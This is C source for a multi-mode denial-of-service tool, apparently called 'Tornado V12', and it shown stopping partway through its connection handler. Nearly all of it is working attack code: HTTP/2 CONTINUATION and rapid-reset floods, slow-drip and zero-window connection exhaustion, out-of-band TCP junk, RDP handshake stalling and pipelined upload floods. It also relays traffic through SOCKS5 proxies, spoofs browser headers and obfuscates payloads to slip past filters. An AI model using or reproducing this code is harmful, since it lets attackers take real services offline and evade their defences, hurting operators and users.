#include "attack.h"
#include "network.h"
#include "logger.h"
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <net/if.h>
#include <poll.h>
#include <sys/ioctl.h>

static __thread Connection *active_conns_list = NULL;

void get_mac_address(const char *iface, unsigned char *mac) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return;
    struct ifreq ifr;
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
}

void get_gateway_mac(const char *iface, unsigned char *mac) {
    FILE *fp = fopen("/proc/net/arp", "r");
    if (!fp) { memset(mac, 0xff, 6); return; }
    char line[256];
    char ip[128], hw_type[128], flags[128], hw_addr[128], mask[128], dev[128];
    while (fgets(line, sizeof(line), fp)) {
        if (sscanf(line, "%s %s %s %s %s %s", ip, hw_type, flags, hw_addr, mask, dev) == 6) {
            if (strcmp(dev, iface) == 0 && strcmp(hw_addr, "00:00:00:00:00:00") != 0) {
                unsigned int m[6];
                if (sscanf(hw_addr, "%x:%x:%x:%x:%x:%x", &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) == 6) {
                    for (int i=0; i<6; i++) mac[i] = (unsigned char)m[i];
                    fclose(fp);
                    return;
                }
            }
        }
    }
    fclose(fp);
    memset(mac, 0xff, 6); // fallback to broadcast
}

static void generate_random_headers(char *headers_out, char *ua_out, const char *host) {
    const char *os_list[] = {
        "Windows NT 10.0; Win64; x64",
        "Macintosh; Intel Mac OS X 10_15_7",
        "X11; Linux x86_64",
        "iPhone; CPU iPhone OS 16_5 like Mac OS X",
        "Linux; Android 13; SM-G991B"
    };
    int os_idx = rand() % 5;
    int chrome_ver = 110 + (rand() % 15);
    snprintf(ua_out, 256, "Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", os_list[os_idx], chrome_ver);
    const char *plat = "Windows";
    if (os_idx == 1) plat = "macOS"; else if (os_idx == 2) plat = "Linux"; else if (os_idx == 3) plat = "iOS"; else if (os_idx == 4) plat = "Android";
    snprintf(headers_out, 1024,
        "Host: %s\r\n"
        "User-Agent: %s\r\n"
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
        "Accept-Language: en-US,en;q=0.9\r\n"
        "Accept-Encoding: gzip, deflate, br\r\n"
        "Sec-Ch-Ua: \"Google Chrome\";v=\"%d\", \"Chromium\";v=\"%d\", \"Not-A.Brand\";v=\"24\"\r\n"
        "Sec-Ch-Ua-Mobile: ?0\r\n"
        "Sec-Ch-Ua-Platform: \"%s\"\r\n"
        "Sec-Fetch-Dest: document\r\n"
        "Sec-Fetch-Mode: navigate\r\n"
        "Sec-Fetch-Site: none\r\n"
        "Sec-Fetch-User: ?1\r\n"
        "Upgrade-Insecure-Requests: 1\r\n"
        "Connection: keep-alive\r\n\r\n",
        host, ua_out, chrome_ver, chrome_ver, plat
    );
}

void generate_heavy_payloads() {
    LOG_INFO("Tornado V12: Pre-calculating 64 lethal payload variants...");
    for (int i = 0; i < PAYLOAD_CACHE_COUNT; i++) {
        payload_pool[i] = malloc(STABLE_PAYLOAD_SIZE);
        int mode = i % 5;
        
        if (mode == 0) { 
            char boundary[64];
            snprintf(boundary, 64, "----%08x%08x", rand(), rand());
            int len = snprintf((char*)payload_pool[i], STABLE_PAYLOAD_SIZE,
                "--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"payload.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n", boundary);
            
            for (int j = len; j < STABLE_PAYLOAD_SIZE - 64; j++) payload_pool[i][j] = rand() % 256;
            
        } else if (mode == 1) { 
            memset(payload_pool[i], '{', 100); 
            for (int j = 100; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = 'A' + (rand() % 26);
        } else if (mode == 2) { 
            
            for (int j = 0; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = (j % 2 == 0) ? 0 : 0xFF;
        } else { 
            for (int j = 0; j < STABLE_PAYLOAD_SIZE; j++) payload_pool[i][j] = rand() % 256;
        }
    }
}



void encrypt_payload(unsigned char *buffer, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        buffer[i] ^= key;
        key = (key + 1) % 256;
    }
}

void obfuscate_payload(unsigned char *buffer, int len) {
    for (int i = 0; i < len; i++) {
        buffer[i] = (buffer[i] << 4) | (buffer[i] >> 4);
    }
}

void handle_connection_event(int epoll_fd, struct epoll_event *ev, int thread_id) {
    int raw_fd = -1;
    if (args.is_raw_udp) {
        raw_fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
        if (raw_fd < 0) {
            LOG_ERR("Raw socket failed");
            return;
        }
    }

    Connection *conn = (Connection *)ev->data.ptr;
    if (!conn) {
        if (raw_fd != -1) close(raw_fd);
        return;
    }
    unsigned char buf[1024];
    int n;
    int force_write = 0;

    if (ev->events & (EPOLLERR | EPOLLHUP)) {
        if (raw_fd != -1) close(raw_fd);
        goto cleanup;
    }

    if (ev->events & EPOLLOUT) {
        conn->writable = 1;
    }

    if (ev->events & EPOLLIN) {
        
        if ((args.is_v15_raw_amp || args.is_vn_tcp || (args.is_hybrid_v15 && proxy_count > 0 && !conn->is_udp_assoc)) && conn->stage == STAGE_ATTACKING) {
            unsigned char drain[65536];
            int dr;
            while ((dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT)) > 0) {}
            if (dr == 0) goto cleanup;
            if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            if (args.is_vn_tcp) {
                // vn: re-arm EPOLLOUT to keep sending
                struct epoll_event ev2;
                ev2.events = EPOLLIN | EPOLLOUT | EPOLLET;
                ev2.data.ptr = conn;
                epoll_ctl(epoll_fd, EPOLL_CTL_MOD, conn->fd, &ev2);
                conn->writable = 1;
            } else {
                int ret;
                while (1) {
                    int s = 16384 + (fast_rand() % 16384);
                    int offset = fast_rand() % (BUFFER_POOL_SIZE - s);
                    ret = send(conn->fd, global_buffer_pool + offset, s, MSG_NOSIGNAL);
                    if (ret <= 0) {
                        if (errno == EAGAIN || errno == EWOULDBLOCK) {
                            conn->writable = 0;
                        }
                        break;
                    }
                    thread_stats[thread_id].packets++;
                    thread_stats[thread_id].tcp_packets++;
                    thread_stats[thread_id].bytes += ret;
                }
                if (ret <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            }
            return;
        }

        if (args.is_hybrid_v15 && proxy_count > 0 && conn->is_udp_assoc && conn->stage == STAGE_ATTACKING) {
            unsigned char drain[1024];
            int dr = recv(conn->fd, drain, sizeof(drain), MSG_DONTWAIT);
            if (dr == 0) goto cleanup;
            if (dr < 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        if (args.is_v4_nightmare && conn->stage == STAGE_ATTACKING) {
            n = recv(conn->fd, buf, 1, 0); 
            if (n <= 0 && errno != EAGAIN && errno != EWOULDBLOCK) goto cleanup;
            return;
        }

        
        if (args.is_crash_mode && conn->stage == STAGE_ATTACKING) {
            while(recv(conn->fd, buf, sizeof(buf), MSG_DONTWAIT) > 0);
            return;
        }

        n = recv(conn->fd, buf, sizeof(buf), 0);
        if (n <= 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK) return;
            goto cleanup;
        }

        if (conn->stage == STAGE_SOCKS_GREET) {
            if (buf[1] == 0x02) {
                conn->stage = STAGE_SOCKS_AUTH;
                conn->sub_stage = 0;
                int ulen = strlen(conn->proxy->user);
                int plen = strlen(conn->proxy->pass);
                unsigned char abuf[256];
                abuf[0] = 0x01; abuf[1] = ulen;
                memcpy(abuf + 2, conn->proxy->user, ulen);
                abuf[2 + ulen] = plen;
                memcpy(abuf + 3 + ulen, conn->proxy->pass, plen);
                send(conn->fd, abuf, 3 + ulen + plen, MSG_NOSIGNAL);
                conn->sub_stage = 1;
            }
            else if (buf[1] == 0x00) {
                conn->stage = STAGE_SOCKS_CONN;
                conn->sub_stage = 0;
                unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
                int req_len = 3;
                if (conn->is_udp_assoc) {
                    req[req_len++] = 0x01;
                    memset(req + req_len, 0, 6);
                    req_len += 6;
                } else if (is_ipv4(args.host)) {
                    req[req_len++] = 0x01;
                    struct in_addr addr;
                    inet_pton(AF_INET, args.host, &addr);
                    memcpy(req + req_len, &addr.s_addr, 4);
                    req_len += 4;
                    unsigned short p = htons(args.port);
                    memcpy(req + req_len, &p, 2);
                    req_len += 2;
                } else {
                    req[req_len++] = 0x03;
                    int hlen = strlen(args.host);
                    req[req_len++] = hlen;
                    memcpy(req + req_len, args.host, hlen);
                    req_len += hlen;
                    unsigned short p = htons(args.port);
                    memcpy(req + req_len, &p, 2);
                    req_len += 2;
                }
                send(conn->fd, req, req_len, MSG_NOSIGNAL);
                conn->sub_stage = 1;
            }
            else goto cleanup;
        } 
        else if (conn->stage == STAGE_SOCKS_AUTH) {
            if (buf[1] != 0x00) goto cleanup; 
            conn->stage = STAGE_SOCKS_CONN;
            conn->sub_stage = 0;
            unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
            int req_len = 3;
            if (conn->is_udp_assoc) {
                req[req_len++] = 0x01;
                memset(req + req_len, 0, 6);
                req_len += 6;
            } else if (is_ipv4(args.host)) {
                req[req_len++] = 0x01;
                struct in_addr addr;
                inet_pton(AF_INET, args.host, &addr);
                memcpy(req + req_len, &addr.s_addr, 4);
                req_len += 4;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            } else {
                req[req_len++] = 0x03;
                int hlen = strlen(args.host);
                req[req_len++] = hlen;
                memcpy(req + req_len, args.host, hlen);
                req_len += hlen;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            }
            send(conn->fd, req, req_len, MSG_NOSIGNAL);
            conn->sub_stage = 1;
        }
        else if (conn->stage == STAGE_SOCKS_CONN) {
            if (buf[1] != 0x00) goto cleanup; 
            
            if (conn->proxy) {
                conn->proxy->fail_count = 0;
                conn->proxy->is_dead = 0;
                __sync_fetch_and_add(&conn->proxy->success_count, 1);
            }
            
            if (conn->is_udp_assoc) {
                struct sockaddr_in raddr;
                memset(&raddr, 0, sizeof(raddr));
                raddr.sin_family = AF_INET;
                if (buf[3] == 0x01) {
                    memcpy(&raddr.sin_addr.s_addr, buf + 4, 4);
                    memcpy(&raddr.sin_port, buf + 8, 2);
                } else if (buf[3] == 0x03) {
                    int len = buf[4];
                    char dom[256];
                    memcpy(dom, buf + 5, len);
                    dom[len] = '\0';
                    char ip_buf[64];
                    if (resolve_host(dom, ip_buf) == 0) {
                        inet_pton(AF_INET, ip_buf, &raddr.sin_addr);
                    } else {
                        inet_pton(AF_INET, conn->proxy->host, &raddr.sin_addr);
                    }
                    memcpy(&raddr.sin_port, buf + 5 + len, 2);
                } else {
                    inet_pton(AF_INET, conn->proxy->host, &raddr.sin_addr);
                    raddr.sin_port = htons(conn->proxy->port);
                }
                conn->udp_relay_addr = raddr;
                
                int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                if (ufd < 0) goto cleanup;
                int sndbuf = 1048576;
                setsockopt(ufd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                if (connect(ufd, (struct sockaddr *)&raddr, sizeof(raddr)) < 0) {
                    close(ufd);
                    goto cleanup;
                }
                conn->client_udp_fd = ufd;
            }
            
            if (args.is_v15_raw_amp || (args.is_hybrid_v15 && !conn->is_udp_assoc) || args.is_vn_tcp) {
                int sndbuf = args.is_vn_tcp ? 4194304 : 1048576;
                setsockopt(conn->fd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
            }
            
            if ((args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) && args.port == 443) {
                conn->stage = STAGE_TLS_HANDSHAKE;
                conn->ssl = SSL_new(ssl_ctx);
                SSL_set_fd(conn->ssl, conn->fd);
                SSL_set_tlsext_host_name(conn->ssl, args.host);
            } else if (args.is_v5_rapid || args.is_v6_void || args.is_v8_phantom) {
                conn->stage = STAGE_H2_PREFACE;
            } else {
                conn->stage = STAGE_ATTACKING;
                conn->writable = 1;
                thread_stats[thread_id].connect_success++;
            }
            conn->sub_stage = 0;
            ev->events |= EPOLLOUT;
            force_write = 1;
        }
    }

    if ((ev->events & EPOLLOUT) || force_write) {
        if (conn->stage == STAGE_TLS_HANDSHAKE) {
            int ret = SSL_connect(conn->ssl);
            if (ret == 1) {
                conn->stage = STAGE_H2_PREFACE;
                conn->sub_stage = 0;
            } else {
                int err = SSL_get_error(conn->ssl, ret);
                if (err != SSL_ERROR_WANT_READ && err != SSL_ERROR_WANT_WRITE) goto cleanup;
                return;
            }
        }

        if (conn->stage == STAGE_H2_PREFACE) {
            if (conn->sub_stage == 0) {
                const char *preface = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";
                if (conn->ssl) SSL_write(conn->ssl, preface, 24);
                else send(conn->fd, preface, 24, 0);
                
                
                unsigned char spoofed_h2_settings[] = {
                    0x00, 0x00, 0x18, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 
                    0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 
                    0x00, 0x03, 0x00, 0x00, 0x03, 0xe8, 
                    0x00, 0x04, 0x00, 0x5f, 0x5e, 0x10  
                };
                if (conn->ssl) SSL_write(conn->ssl, spoofed_h2_settings, sizeof(spoofed_h2_settings));
                else send(conn->fd, spoofed_h2_settings, sizeof(spoofed_h2_settings), 0);
                
                unsigned char window_update[] = {
                    0x00, 0x00, 0x04, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x0f, 0x00, 0x00
                };
                if (conn->ssl) SSL_write(conn->ssl, window_update, sizeof(window_update));
                else send(conn->fd, window_update, sizeof(window_update), 0);
                
                conn->sub_stage = 1;
                conn->stage = STAGE_ATTACKING;
                conn->h2_stream_id = 1;
                thread_stats[thread_id].connect_success++;
            }
        }
        if (conn->stage == STAGE_CONNECTING) {
            if (conn->proxy) {
                unsigned char greet[] = {0x05, 0x02, 0x00, 0x02};
                send(conn->fd, greet, 4, 0);
                conn->stage = STAGE_SOCKS_GREET;
                
                
                int mss = 536 + (rand() % 924); 
                setsockopt(conn->fd, IPPROTO_TCP, TCP_MAXSEG, &mss, sizeof(mss));
            } else {
                if (conn->is_udp_assoc) {
                    int ufd = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
                    if (ufd >= 0) {
                        int sndbuf = 1048576;
                        setsockopt(ufd, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
                        struct sockaddr_in raddr;
                        memset(&raddr, 0, sizeof(raddr));
                        raddr.sin_family = AF_INET;
                        raddr.sin_port = htons(conn->target_port);
                        inet_pton(AF_INET, args.target_ip, &raddr.sin_addr);
                        if (connect(ufd, (struct sockaddr *)&raddr, sizeof(raddr)) >= 0) {
                            conn->client_udp_fd = ufd;
                        } else {
                            close(ufd);
                        }
                    }
                }
                conn->stage = STAGE_ATTACKING;
                conn->writable = 1;
                thread_stats[thread_id].connect_success++;
            }
        } 
        
        if (conn->stage == STAGE_SOCKS_AUTH && conn->sub_stage == 0) {
            int ulen = strlen(conn->proxy->user);
            int plen = strlen(conn->proxy->pass);
            buf[0] = 0x01; buf[1] = ulen;
            memcpy(buf + 2, conn->proxy->user, ulen);
            buf[2 + ulen] = plen;
            memcpy(buf + 3 + ulen, conn->proxy->pass, plen);
            send(conn->fd, buf, 3 + ulen + plen, 0);
            conn->sub_stage = 1;
        }
        
        if (conn->stage == STAGE_SOCKS_CONN && conn->sub_stage == 0) {
            unsigned char req[512] = {0x05, conn->is_udp_assoc ? 0x03 : 0x01, 0x00};
            int req_len = 3;
            if (conn->is_udp_assoc) {
                req[req_len++] = 0x01;
                memset(req + req_len, 0, 6);
                req_len += 6;
            } else if (is_ipv4(args.host)) {
                req[req_len++] = 0x01; 
                struct in_addr addr;
                inet_pton(AF_INET, args.host, &addr);
                memcpy(req + req_len, &addr.s_addr, 4);
                req_len += 4;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            } else {
                req[req_len++] = 0x03; 
                int hlen = strlen(args.host);
                req[req_len++] = hlen;
                memcpy(req + req_len, args.host, hlen);
                req_len += hlen;
                unsigned short p = htons(args.port);
                memcpy(req + req_len, &p, 2);
                req_len += 2;
            }
            send(conn->fd, req, req_len, 0);
            conn->sub_stage = 1;
        }

        if (conn->stage == STAGE_ATTACKING) {
            long long now = get_ms();
            
            
            if (args.is_v8_phantom) {
                if (conn->sub_stage == 0) {
                    
                    unsigned char h2_packet[256];
                    int pos = 0;
                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1}; 
                    int h_len = sizeof(headers_payload);
                    
                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
                    h2_packet[pos++] = h_len & 0xFF;
                    h2_packet[pos++] = 0x01; 
                    h2_packet[pos++] = 0x00; 
                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                    memcpy(h2_packet + pos, headers_payload, h_len);
                    pos += h_len;
                    
                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                    
                    conn->thread_id = 10 + (rand() % 40); 
                } else {
                    
                    if (now - conn->last_pulse_ms >= conn->thread_id) {
                        unsigned char h2_packet[4096];
                        int pos = 0;
                        
                        
                        
                        for (int i = 0; i < 30; i++) {
                            unsigned char cont_payload[] = {0xde, 0xad, 0xbe, 0xef}; 
                            int h_len = sizeof(cont_payload);
                            
                            h2_packet[pos++] = (h_len >> 16) & 0xFF;
                            h2_packet[pos++] = (h_len >> 8) & 0xFF;
                            h2_packet[pos++] = h_len & 0xFF;
                            h2_packet[pos++] = 0x09; 
                            h2_packet[pos++] = 0x00; 
                            h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                            h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                            h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                            h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                            memcpy(h2_packet + pos, cont_payload, h_len);
                            pos += h_len;
                        }
                        
                        if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                        else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                        
                        thread_stats[thread_id].packets += 30; 
                        conn->last_pulse_ms = now;
                        conn->thread_id = 5 + (rand() % 20); 
                    }
                }
            }
            
            else if (args.is_v6_void) {
                if (conn->sub_stage == 0) {
                    
                    unsigned char h2_packet[128];
                    int pos = 0;
                    unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1}; 
                    int h_len = sizeof(headers_payload);
                    
                    h2_packet[pos++] = (h_len >> 16) & 0xFF;
                    h2_packet[pos++] = (h_len >> 8) & 0xFF;
                    h2_packet[pos++] = h_len & 0xFF;
                    h2_packet[pos++] = 0x01; 
                    h2_packet[pos++] = 0x00; 
                    h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                    h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                    h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                    h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                    memcpy(h2_packet + pos, headers_payload, h_len);
                    pos += h_len;
                    
                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    conn->sub_stage = 1; 
                    conn->last_pulse_ms = now;
                } else {
                    if (now - conn->last_pulse_ms >= 1) { 
                        unsigned char h2_packet[8192];
                        int pos = 0;
                        
                        
                        for (int i = 0; i < 200; i++) {
                            unsigned char cont_payload[] = {0xaa, 0xbb, 0xcc, 0xdd}; 
                            int h_len = sizeof(cont_payload);
                            
                            h2_packet[pos++] = (h_len >> 16) & 0xFF;
                            h2_packet[pos++] = (h_len >> 8) & 0xFF;
                            h2_packet[pos++] = h_len & 0xFF;
                            h2_packet[pos++] = 0x09; 
                            h2_packet[pos++] = 0x00; 
                            h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                            h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                            h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                            h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                            memcpy(h2_packet + pos, cont_payload, h_len);
                            pos += h_len;
                        }
                        
                        if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                        else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                        
                        thread_stats[thread_id].packets += 200;
                        conn->last_pulse_ms = now;
                    }
                }
            }
            
            else if (args.is_v5_rapid) {
                if (now - conn->last_pulse_ms >= 5) {
                    
                    unsigned char h2_packet[8192];
                    int pos = 0;
                    
                    for (int i = 0; i < 50; i++) { 
                        
                        
                        unsigned char headers_payload[] = {0x82, 0x86, 0x84, 0x41, 0x8c, 0xf1, 0xe3, 0xc2, 0xe5, 0xf2, 0x3a, 0x6b, 0xa0, 0xab, 0x90, 0xf4, 0xff};
                        int h_len = sizeof(headers_payload);
                        
                        h2_packet[pos++] = (h_len >> 16) & 0xFF;
                        h2_packet[pos++] = (h_len >> 8) & 0xFF;
                        h2_packet[pos++] = h_len & 0xFF;
                        h2_packet[pos++] = 0x01; 
                        h2_packet[pos++] = 0x04; 
                        h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                        h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                        h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                        h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                        memcpy(h2_packet + pos, headers_payload, h_len);
                        pos += h_len;

                        
                        h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x04; 
                        h2_packet[pos++] = 0x03; 
                        h2_packet[pos++] = 0x00;
                        h2_packet[pos++] = (conn->h2_stream_id >> 24) & 0x7F;
                        h2_packet[pos++] = (conn->h2_stream_id >> 16) & 0xFF;
                        h2_packet[pos++] = (conn->h2_stream_id >> 8) & 0xFF;
                        h2_packet[pos++] = conn->h2_stream_id & 0xFF;
                        h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x00; h2_packet[pos++] = 0x08; 
                        pos += 4;

                        conn->h2_stream_id += 2;
                        if (conn->h2_stream_id > 0x7FFFFFFF) conn->h2_stream_id = 1;
                        if (pos > 7800) break;
                    }

                    if (conn->ssl) SSL_write(conn->ssl, h2_packet, pos);
                    else send(conn->fd, h2_packet, pos, MSG_NOSIGNAL);
                    
                    thread_stats[thread_id].packets += 100;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v4_nightmare) {
                if (conn->sub_stage == 0) {
                    char init_payload[] = "GET / HTTP/1.1\r\nHost: \r\n\r\n";
                    send(conn->fd, init_payload, sizeof(init_payload)-1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else if (now - conn->last_pulse_ms >= 2) { 
                    
                    
                    
                    int overlap_size = 12 + (rand() % 8);
                    
                    
                    send(conn->fd, global_buffer_pool + (rand() % 1024), overlap_size, MSG_OOB | MSG_NOSIGNAL);
                    
                    
                    send(conn->fd, global_buffer_pool + (rand() % 1024), overlap_size * 2, MSG_NOSIGNAL);
                    
                    thread_stats[thread_id].packets += 2;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v3_killer) {
                if (conn->sub_stage == 0) {
                    
                    char init_payload[] = "GET / HTTP/1.1\r\nHost: \r\n\r\n";
                    send(conn->fd, init_payload, sizeof(init_payload)-1, MSG_NOSIGNAL);
                    
                    
                    int zero = 0;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &zero, sizeof(zero));
                    
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else {
                    
                    
                    if (now - conn->last_pulse_ms >= 10) {
                        send(conn->fd, "V", 1, MSG_NOSIGNAL);
                        thread_stats[thread_id].packets++;
                        conn->last_pulse_ms = now;
                    }
                }
            } 
            
            else if (args.is_v9_hydra) {
                if (conn->sub_stage == 0) {
                    
                    int window_size = (rand() % 2 == 0) ? 0 : 65535;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &window_size, sizeof(window_size));
                    
                    
                    send(conn->fd, "X", 1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                } else if (now - conn->last_pulse_ms >= 10) {
                    
                    
                    int flags = (rand() % 3 == 0) ? (MSG_OOB | MSG_NOSIGNAL) : MSG_NOSIGNAL;
                    
                    
                    char sack_trigger[16];
                    for(int i=0; i<16; i++) sack_trigger[i] = rand() % 255;
                    
                    send(conn->fd, sack_trigger, sizeof(sack_trigger), flags);
                    
                    
                    int window_size = (rand() % 2 == 0) ? 0 : (1024 + rand() % 8192);
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &window_size, sizeof(window_size));
                    
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v10_persist) {
                if (conn->sub_stage == 0) {
                    
                    int win = (rand() % 2 == 0) ? 0 : 65535;
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                    
                    send(conn->fd, "P", 1, MSG_NOSIGNAL);
                    conn->sub_stage = 1;
                    conn->last_pulse_ms = now;
                    
                    conn->keepalive_interval_ms = 15000 + (rand() % 15001);
                } else if (now - conn->last_pulse_ms >= conn->keepalive_interval_ms) {
                    
                    int flags = MSG_NOSIGNAL;
                    int r = rand() % 4;
                    if (r == 0) flags |= MSG_OOB;          
                    else if (r == 1) flags |= MSG_DONTWAIT; 
                    
                    send(conn->fd, "P", 1, flags);
                    
                    int win = (rand() % 2 == 0) ? 0 : (1024 + rand() % 8192);
                    setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                    
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                    conn->keepalive_interval_ms = 15000 + (rand() % 15001);
                }
            }
            
            else if (args.is_v12_eclipse) {
                if (now - conn->last_pulse_ms >= 30 + conn->jitter_ms) { 
                    unsigned char *payload = payload_pool[conn->payload_idx % PAYLOAD_CACHE_COUNT];
                    conn->payload_idx++;
                    
                    
                    char pipe_head[512];
                    int h_len = snprintf(pipe_head, 512, 
                        "POST /uploads/%d HTTP/1.1\r\n"
                        "Host: %s\r\n"
                        "Content-Length: %d\r\n"
                        "Connection: keep-alive\r\n\r\n", 
                        rand(), args.host, STABLE_PAYLOAD_SIZE);
                    
                    if (conn->ssl) {
                        SSL_write(conn->ssl, pipe_head, h_len);
                        SSL_write(conn->ssl, payload, STABLE_PAYLOAD_SIZE);
                    } else {
                        send(conn->fd, pipe_head, h_len, MSG_NOSIGNAL);
                        send(conn->fd, payload, STABLE_PAYLOAD_SIZE, MSG_NOSIGNAL);
                    }
                    
                    thread_stats[thread_id].packets += 2;
                    thread_stats[thread_id].bytes += (h_len + STABLE_PAYLOAD_SIZE);
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v13_shadow) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) {
                    BypassPattern *bp = &bypass_patterns[rand() % bypass_patterns_count];
                    unsigned char packet[1500];
                    memcpy(packet, bp->pattern, bp->length);
                    
                    for(int j=bp->length; j<1400; j++) packet[j] = rand() % 256;
                    
                    
                    encrypt_payload(packet, 1400, rand() % 256);
                    obfuscate_payload(packet, 1400);
                    
                    send(conn->fd, packet, 1400, MSG_NOSIGNAL);
                    thread_stats[thread_id].packets++;
                    conn->last_pulse_ms = now;
                }
            }
            
            else if (args.is_v14_phantom) {
                if (now - conn->last_pulse_ms >= 50 + conn->jitter_ms) { 
                    if (conn->sub_stage < 19) {
                        
                        
                        unsigned char rdp_cr[] = {
                            0x03, 0x00, 0x00, 0x13, 0x0e, 0xe0, 0x00, 0x00, 
                            0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x00, 0x03, 
                            0x00, 0x00, 0x00
                        };
                        send(conn->fd, &rdp_cr[conn->sub_stage], 1, MSG_NOSIGNAL);
                        conn->sub_stage++;
                        conn->last_pulse_ms = now;
                    } 
                    else if (conn->sub_stage == 19) {
                        
                        
                        int win = 0;
                        setsockopt(conn->fd, SOL_SOCKET, SO_RCVBUF, &win, sizeof(win));
                        
                        
                        for (int i = 0; i < 5; i++) {
                            unsigned char poison = rand() % 256;
                            send(conn->fd, &poison, 1, MSG_OOB | MSG_NOSIGNAL);
                        }
                        
                        conn->sub_stage = 20;
                        conn->last_pulse_ms = now;
                    } 
                    else {
                        
                        if (now - conn->last_pulse_ms >= 20000) {
                            goto cleanup; 
                        }
                        
                        if (now % 100 == 0) {
                            char junk = 0xFF;
                            send(conn->fd, &junk, 1, MSG_NOSIGNAL);
                        }
                    }
                }
            }
